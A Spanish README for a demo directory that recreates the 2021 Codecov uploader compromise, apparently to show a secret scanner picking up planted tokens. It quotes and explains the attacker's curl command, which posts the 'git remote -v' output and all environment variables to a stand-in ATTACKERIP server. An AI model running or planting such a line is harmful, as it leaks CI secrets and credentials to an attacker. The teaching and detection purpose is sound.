# Caso Codecov - Compromiso de Script de Carga

Este directorio simula el famoso caso de Codecov de 2021 donde el script de carga de cobertura fue comprometido.

## 🚨 Incidente Real de Codecov (2021)

En abril de 2021, Codecov fue comprometido cuando atacantes modificaron el script `bash uploader` para incluir código malicioso que exfiltraba:

- Variables de entorno (incluyendo secretos)
- Información de repositorios git
- Tokens de CI/CD
- Credenciales de servicios

## 🔍 Comando Malicioso Original

El comando malicioso insertado fue:
```bash
search_in="$proj_root"
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://ATTACKERIP/upload/v2 || true
```

### Explicación del Comando:
- `$(git remote -v)`: Obtiene información de repositorios remotos
- `<<<<<< ENV`: Separador para distinguir secciones de datos
- `$(env)`: Captura todas las variables de entorno
- `http://ATTACKERIP/upload/v2`: Envía datos al servidor del atacante
- `|| true`: Evita que el script falle si la exfiltración no funciona

## 📁 Archivos en este Directorio:

1. **`malicious-script.sh`**: Simulación directa del comando malicioso
2. **`compromised-uploader.sh`**: Script completo que simula el uploader comprometido
3. **`config.json`**: Configuración con tokens expuestos
4. **`package.json`**: Configuración de npm con secretos
5. **`upload-coverage.sh`**: Script original con tokens hardcodeados

## 🎯 Vulnerabilidades Simuladas:

- **Exfiltración de Variables de Entorno**: Secretos en ENV vars
- **Tokens de API Expuestos**: GitHub, AWS, Stripe, etc.
- **Información de Repositorios**: URLs y configuraciones git
- **Credenciales de CI/CD**: Tokens de build y deployment
- **Configuraciones Sensibles**: Archivos .env y config

## 🔍 Comando para Escanear:

```bash
vault-radar scan repo ./codecov-case
```

## 📊 Findings Esperados:

- GitHub Personal Access Tokens
- AWS Access Keys
- Codecov Tokens
- SonarQube Tokens
- Database Connection Strings
- JWT Secrets
- Slack Webhooks
- Datadog API Keys

Este caso demuestra la importancia de:
- Validar la integridad de scripts de terceros
- No almacenar secretos en variables de entorno
- Monitorear cambios en herramientas de CI/CD
- Usar Vault Radar para detectar secretos expuestos
